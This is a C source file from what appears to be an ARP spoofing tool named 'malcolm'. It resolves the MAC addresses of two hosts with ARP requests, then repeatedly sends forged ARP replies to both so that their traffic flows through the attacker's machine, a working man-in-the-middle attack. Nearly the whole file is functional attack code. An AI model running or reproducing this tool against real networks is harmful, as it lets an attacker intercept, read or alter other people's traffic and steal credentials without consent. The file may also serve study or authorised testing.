#include "../headers/malcolm.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_arp.h>

static int handle_response(uint8_t *ip, char *buffer, uint8_t *received_mac)
{
	struct arp_hdr *arp;
	struct ethernet_hdr *ethernet;
	uint16_t type;
	uint16_t opcode;

	ethernet = (struct ethernet_hdr *)buffer;
	arp = (struct arp_hdr *)(buffer + sizeof(struct ethernet_hdr));

	type = ft_ntohs(ethernet->type);
	opcode = ft_ntohs(arp->op);

	if (type == ETH_P_ARP && opcode == ARP_REPLY &&
		!filter_out(ip, arp->sip)) {
		ft_memcpy(received_mac, arp->sha, ETH_ADDR_LEN);
		return 1;
	}
	else {
		dprintf(STDOUT_FILENO, "Filtering reply from ");
		print_ip(STDOUT_FILENO, arp->sip);
		dprintf(STDOUT_FILENO, "\n");
	}

	return 0;
}

static int spoof(uint8_t *tip, uint8_t *tmac, uint8_t *sip, uint8_t *smac,
	struct sockaddr_ll sockaddr)
{
	socklen_t addr_len = sizeof(struct sockaddr_ll);
	struct arp_packet packet = {0};
	int ret;

	/* Setting ETHERNET flags */
	packet.ethernet.type = ft_ntohs(ETH_P_ARP);
	/* Setting ARP flags */
	packet.arp.hrd = ft_htons(HARDWARE_ETHERNET);
	packet.arp.hln = ETH_ADDR_LEN;
	packet.arp.pln = IP_ADDR_LEN;
	packet.arp.pro = ft_htons(ETH_P_IP);
	packet.arp.op = ft_htons(ARP_REPLY);

	/* Setting MAC addresses */
	/* Ethernet */
	ft_memcpy(packet.ethernet.dmac, tmac, ETH_ADDR_LEN);
	ft_memcpy(packet.ethernet.smac, smac, ETH_ADDR_LEN);
	/* ARP */
	ft_memcpy(packet.arp.tha, tmac, ETH_ADDR_LEN);
	ft_memcpy(packet.arp.sha, smac, ETH_ADDR_LEN);
	/* Setting IP addresses */
	ft_memcpy(packet.arp.sip, sip, IP_ADDR_LEN);
	ft_memcpy(packet.arp.tip, tip, IP_ADDR_LEN);

	/* debug_packet(&packet.ethernet, &packet.arp); */

	ret = sendto(g_data.sockfd, &packet, sizeof(struct arp_packet), 0,
		(struct sockaddr *)&sockaddr, addr_len);

	if (ret <= 0) {
		dprintf(STDERR_FILENO, "[!] Failed to send ARP replay for host ");
		print_ip(STDERR_FILENO, tip);
		dprintf(STDERR_FILENO, "\n");
		return 1;
	}

	return 0;
}

static int arp_request(uint8_t *tip, struct sockaddr_ll sockaddr,
	uint8_t *if_mac, uint8_t *if_ip, uint8_t *received_mac)
{
	socklen_t addr_len = sizeof(struct sockaddr_ll);
	struct arp_packet packet = {0};
	int ret;
	/* TODO: Parse dynamically the broadcast MAC address ? */
	/* We assume the broadcast is always ff:ff:ff:ff:ff:ff */
	uint8_t brdcst[ETH_ADDR_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
	int len = sizeof(struct ethernet_hdr) + sizeof(struct arp_hdr);
	char buffer[len];

	/* Setting ETHERNET flags */
	packet.ethernet.type = ft_ntohs(ETH_P_ARP);
	/* Setting ARP flags */
	packet.arp.hrd = ft_htons(HARDWARE_ETHERNET);
	packet.arp.hln = ETH_ADDR_LEN;
	packet.arp.pln = IP_ADDR_LEN;
	packet.arp.pro = ft_htons(ETH_P_IP);
	packet.arp.op = ft_htons(ARP_REQUEST);

	/* Setting MAC addresses */
	/* Ethernet */
	ft_memcpy(packet.ethernet.dmac, brdcst, ETH_ADDR_LEN);
	ft_memcpy(packet.ethernet.smac, if_mac, ETH_ADDR_LEN);
	/* ARP */
	ft_memcpy(packet.arp.sha, if_mac, ETH_ADDR_LEN);
	/* Setting IP addresses */
	ft_memcpy(packet.arp.sip, if_ip, IP_ADDR_LEN);
	ft_memcpy(packet.arp.tip, tip, IP_ADDR_LEN);

	/* debug_packet(&packet.ethernet, &packet.arp); */

	ret = sendto(g_data.sockfd, &packet, sizeof(struct arp_packet), 0,
		(struct sockaddr *)&sockaddr, addr_len);

	if (ret <= 0) {
		dprintf(STDERR_FILENO, "[!] Failed to send ARP request for host ");
		print_ip(STDERR_FILENO, tip);
		dprintf(STDERR_FILENO, "\n");
		return 1;
	}

	/* Waiting for response, it should be fast ! */
	dprintf(STDOUT_FILENO, "Waiting ARP response for ip ");
	print_ip(STDOUT_FILENO, tip);
	dprintf(STDOUT_FILENO, ", press CTRL+C to exit...\n");
	alarm(ARP_TIMEOUT); /* Set timeout to 3 by default, response should be fast */
	while (g_data.loop) {
		ret = recvfrom(g_data.sockfd, buffer, len, MSG_DONTWAIT,
			(struct sockaddr *)&sockaddr, &addr_len);
		if (ret > 0 && handle_response(tip, buffer, received_mac)) {
			print_ip(STDOUT_FILENO, tip);
			dprintf(STDOUT_FILENO, " is at ");
			print_mac(received_mac);
			fflush(stdout);
			dprintf(STDOUT_FILENO, "\n");
			return 0;
		}
	}

	dprintf(STDERR_FILENO, "[!] Couldn't manage to get MAC address for ip ");
	print_ip(STDERR_FILENO, tip);
	dprintf(STDERR_FILENO, "\n");

	return 1;
}

int ft_proxy(uint8_t *source_ip, uint8_t *target_ip)
{
	struct sockaddr_ll sockaddr;
	int if_idx;
	uint8_t if_mac[ETH_ADDR_LEN] = {0};
	uint8_t if_ip[IP_ADDR_LEN] = {0};
	struct timespec wait = {g_data.frequency, 0};

	ft_bzero(&sockaddr, sizeof(struct sockaddr_ll));

	/* Getting interface informations */
	if ((if_idx = interface_index(g_data.interface)) < 0)
		return 1;
	if (interface_mac(g_data.interface, if_mac) < 0)
		return 1;
	if (interface_ip(g_data.interface, if_ip) < 0)
		return 1;

	/* Debug prints */
	/* printf("%s has index %d with MAC address ", g_data.interface, if_idx);
	print_mac(if_mac);
	printf(" and IP address ");
	fflush(stdout);
	print_ip(STDOUT_FILENO, if_ip);
	printf("\n"); */

	/* Filling sockaddr_ll */
	sockaddr.sll_family = AF_PACKET;
	sockaddr.sll_protocol = htons(ETH_P_ALL);
	sockaddr.sll_ifindex = if_idx;
	sockaddr.sll_hatype = ARPHRD_ETHER;
	sockaddr.sll_pkttype = ARPHRD_NETROM;

	/* Getting MAC addresses with ARP requests */
	if (arp_request(source_ip, sockaddr, if_mac, if_ip, g_data.source_mac) ||
		arp_request(target_ip, sockaddr, if_mac, if_ip, g_data.target_mac))
		return 1;

	dprintf(STDOUT_FILENO, "Proxying between ");
	print_ip(STDOUT_FILENO, g_data.source_ip);
	dprintf(STDOUT_FILENO, " and ");
	print_ip(STDOUT_FILENO, g_data.target_ip);
	if (g_data.duration) {
		dprintf(STDOUT_FILENO, " for %d seconds", g_data.duration);
		alarm(g_data.duration);
	}
	dprintf(STDOUT_FILENO, "\n");

	uint8_t wait_loop_len = 4;
	char *wait_loop = "/|\\|";
	uint64_t i = 0;

	while (g_data.loop) {
		if ((spoof(target_ip, g_data.target_mac, source_ip, if_mac,
			sockaddr)) != 0 ||
			(spoof(source_ip, g_data.source_mac, target_ip, if_mac,
			sockaddr) != 0))
		{
			break;
		}

		/* Display related */
		ft_putchar('\r');
		printf("Spoofing ");
		fflush(stdout);
		ft_putchar(wait_loop[i % wait_loop_len]);
		i++;

		clock_nanosleep(CLOCK_REALTIME, 0, &wait, NULL);
	}

	return 0;
}
